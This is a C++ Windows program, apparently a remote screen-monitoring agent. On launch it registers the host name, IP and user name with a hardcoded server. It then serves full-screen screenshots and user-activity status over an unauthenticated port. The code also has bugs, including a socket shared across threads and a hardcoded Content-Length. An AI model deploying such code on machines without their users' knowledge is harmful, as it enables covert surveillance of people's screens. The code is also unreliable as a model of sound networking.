#include <winsock2.h>
#include <wingdi.h>
#include <winuser.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <sstream>

#define SERVER_ADDR "10.10.10.72"
#define SERVER_PORT 8888
#define CLIENT_ADDR 2
//#pragma comment(lib, "ws2_32.lib")

class HttpServer {
private:
    WSADATA wsaData;
    SOCKET listenSocket = INVALID_SOCKET;
    SOCKET clientSocket = INVALID_SOCKET;
    std::mutex clientMutex;
		std::string machine, ip, user;
		//HBITMAP hBitmap;
    // Инициализация WinSock
    bool initWinSock() {
        int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
        return result == 0;
    }

    // Настройка серверного сокета
    bool setupServerSocket(int port) {
        // Создание сокета для прослушивания
        listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (listenSocket == INVALID_SOCKET) {
            std::cerr << "Ошибка создания сокета: " << WSAGetLastError() << std::endl;
            return false;
        }
        
        // Настройка адреса сервера
        sockaddr_in serverAddress;
        serverAddress.sin_family = AF_INET;
        serverAddress.sin_addr.s_addr = INADDR_ANY;
				serverAddress.sin_port = htons(port);
				
				// Связывание сокета с адресом
        if (bind(listenSocket, (SOCKADDR*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
            std::cerr << "Ошибка bind: " << WSAGetLastError() << std::endl;
            closesocket(listenSocket);
            return false;
        }
        
        // Начало прослушивания
        if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
            std::cerr << "Ошибка listen: " << WSAGetLastError() << std::endl;
            closesocket(listenSocket);
            return false;
        }
        return true;
    }
    
    // Обработка клиентского подключения
    void handleClient() {
        std::vector<char> buffer(4096);
        std::string request;
        
        // Получение данных от клиента
        int bytesReceived = recv(clientSocket, buffer.data(), buffer.size(), 0);
        if (bytesReceived <= 0) {
            std::cerr << "Ошибка при получении данных" << std::endl;
            return;
        }
        
        request.assign(buffer.data(), bytesReceived);
        
				LASTINPUTINFO last_input;
				last_input.cbSize = sizeof(LASTINPUTINFO);
				bool ok = GetLastInputInfo(&last_input);
				DWORD currentTime = GetTickCount();
				DWORD duration = (currentTime - last_input.dwTime) / 1000;

        // Проверка запроса на /ping
        if (request.find("/ping") != std::string::npos && ok && duration < 10) {
          std::string response = "HTTP/1.1 200 OK\r\nContent-Length: 34\r\n\r\n" + machine + " " + ip + "" + user;
          send(clientSocket, response.c_str(), response.length(), 0);
        } else if (request.find("/getimage") != std::string::npos) {
					std::vector<char> img = getImage();
					
					std::string response = "HTTP/1.1 200 OK\r\nContent-Type: image/bmp\r\n\
					Content-Transfer-Encoding: binary\r\n";
					response += "Content-Length: " + std::to_string(img.size()) + "\r\n\r\n";
					send(clientSocket, response.c_str(), response.size(), 0);
					send(clientSocket, img.data(), img.size(), 0);
				} else {
          std::string response = "HTTP/1.1 404 Not Found\r\n\r\n";
          send(clientSocket, response.c_str(), response.length(), 0);
        }
        
        closesocket(clientSocket);
    }
    
    // Основной цикл обработки подключений
    void startListening() {
        std::cout << "Сервер запущен. Ожидание подключений..." << std::endl;
        
        while (true) {
            clientSocket = accept(listenSocket, NULL, NULL);
            if (clientSocket == INVALID_SOCKET) {
                std::cerr << "Ошибка accept: " << WSAGetLastError() << std::endl;
                continue;
            }
            
            // Создание нового потока для обработки клиента
            std::thread clientThread(&HttpServer::handleClient, this);
            clientThread.detach();
        }
    }
		
		bool sendMessage(std::string &m) {
			WSADATA ws;
			int iResult = WSAStartup(MAKEWORD(2, 2), &ws);
			if (iResult != NO_ERROR) {
				std::cerr << "WSAStartup function failed with error: " << iResult << std::endl;
        return false;
			}
			
			SOCKET ConnectSocket;
			ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			if (ConnectSocket == INVALID_SOCKET) {
				std::cerr << "socket function failed with error: " << WSAGetLastError() << std::endl;
				WSACleanup();
				return false;
			}
			sockaddr_in clientService;
			clientService.sin_family = AF_INET;
			clientService.sin_addr.s_addr = inet_addr(SERVER_ADDR);
			clientService.sin_port = htons(SERVER_PORT);
			
			iResult = connect(ConnectSocket, (SOCKADDR *) & clientService, sizeof (clientService));
			if (iResult == SOCKET_ERROR) {
				std::cerr << "connect function failed with error: " << WSAGetLastError() << std::endl;
        iResult = closesocket(ConnectSocket);
        if (iResult == SOCKET_ERROR)
					std::cerr << "closesocket function failed with error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return false;
			}
			std::string request("POST /adduser HTTP/1.1\r\n");
      request += std::string("Host: ") + SERVER_ADDR + "\r\n";
      request += "Content-Type: application/json\r\n";
      request += "Content-Length: " + std::to_string(m.size()) + "\r\n";
      request += "Connection: close\r\n\r\n";
      request += m;
			int bsent = send(ConnectSocket, request.c_str(), request.size(), 0);
			/*
			char answer[1024];
			int bytesReceives = recv(ConnectSocket, answer, sizeof(answer), 0);
			std::string receive(answer, answer + bytesReceives);
			if (receive.find("not found")) {
				closesocket(ConnectSocket);
				return false;
			}
			*/
			iResult = closesocket(ConnectSocket);
			if (iResult == SOCKET_ERROR) {
				std::cerr << "closesocket function failed with error: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return false;
			}
			WSACleanup();
			return true;
		}
		
		
		std::vector<char> getImage()  {
			BITMAPINFO bmi;
			SetThreadDpiAwarenessContext(DPI_AWARENESS_CONTEXT_SYSTEM_AWARE);
			int width  = GetSystemMetrics(SM_CXSCREEN);
			int height = GetSystemMetrics(SM_CYSCREEN);
			
			bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
			bmi.bmiHeader.biWidth = width;
			bmi.bmiHeader.biHeight = height;
			bmi.bmiHeader.biPlanes = 1;
			bmi.bmiHeader.biBitCount = 32;
			bmi.bmiHeader.biCompression = BI_RGB;
			
			char *bitmapData = new char[width * height * 4]{0};
			
			HDC hdc = GetDC(NULL);
			if(!hdc) return std::vector<char>();
	
			HDC memdc = CreateCompatibleDC(hdc);
			if(!memdc) {
				ReleaseDC(NULL, hdc);
				return std::vector<char>();
			}
			HBITMAP hBitmap = CreateCompatibleBitmap(hdc, width, height);
	
			if (!hBitmap) {
				ReleaseDC(nullptr, hdc);
				return std::vector<char>();
			}

			HBITMAP oldbmp = (HBITMAP)SelectObject(memdc, hBitmap);
			BitBlt(memdc, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
			GetDIBits(hdc, hBitmap, 0, bmi.bmiHeader.biHeight, bitmapData, &bmi, DIB_RGB_COLORS);
	
			SelectObject(memdc, oldbmp);
			
			DeleteDC(memdc);
			ReleaseDC(nullptr, hdc);
   
			int infoSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + width * height * 4;
			std::vector<char> ret;
			ret.resize(infoSize);
	
			BITMAPFILEHEADER* bfh = reinterpret_cast<BITMAPFILEHEADER*>(ret.data());
			bfh->bfType = 0x4d42; // 'BM'
			bfh->bfSize = infoSize;
			bfh->bfReserved1 = 0;
			bfh->bfReserved2 = 0;
			bfh->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
			
			
			BITMAPINFOHEADER* bm = reinterpret_cast<BITMAPINFOHEADER*>(ret.data() + sizeof(BITMAPFILEHEADER));
			bm->biSize = sizeof(BITMAPINFOHEADER);
			bm->biWidth = width;
			bm->biHeight = height;
			bm->biPlanes = 1;
			bm->biBitCount = 32;
			bm->biCompression = BI_RGB;
			bm->biSizeImage = width * height * 4;
			memcpy(ret.data() + bfh->bfOffBits, bitmapData, width * height * 4);
			delete [] bitmapData;
			return ret;
		}

public:
    HttpServer(int port) {
        if (!initWinSock()) {
            throw std::runtime_error("Ошибка инициализации WinSock");
        }
        
        if (!setupServerSocket(port)) {
            WSACleanup();
            throw std::runtime_error("Ошибка настройки серверного сокета");
        }
				
				char buffer[1024];
				//get machine name
				gethostname(buffer, sizeof(buffer));
				machine = std::string(buffer);
				
				//get ip
				hostent *host = gethostbyname(buffer);
				std::vector<std::string> list;
				for (char **temp = host->h_addr_list; ((in_addr *)*temp) != NULL; ++temp) {
					list.push_back(std::string(inet_ntoa(*(in_addr *)temp[0])));
				}
				ip = list[CLIENT_ADDR];
				//ip = std::string(inet_ntoa(*(struct in_addr *)host->h_addr_list[0]));

				// get user
				DWORD username_len = 1024;
				GetUserName(buffer, &username_len);
				user = std::string(buffer);

				std::string m = "{\"domain\":\"test\",\"mashine\":\"" + machine
				+ "\",\"ip\":\"" + ip + "\",\"user\":\"" + user + "\"}";

				/*for (std::string &s : list) {
					std::string m = "{\"domain\":\"test\",\"mashine\":\"" + machine
					+ "\",\"ip\":\"" + s + "\",\"user\":\"" + user + "\"}";
					if (sendMessage(m)) {
						ip = s;
						break;
					}
				}*/
				if (!sendMessage(m)) {
					return;
				}
        startListening();
    }
    
    ~HttpServer() {
        if (listenSocket != INVALID_SOCKET) {
            closesocket(listenSocket);
        }
        WSACleanup();
    }
};

int main() {
    try {
        HttpServer server(7777);
    } catch (const std::exception& e) {
        std::cerr << "Ошибка: " << e.what() << std::endl;
        return 1;
    }
    return 0;
}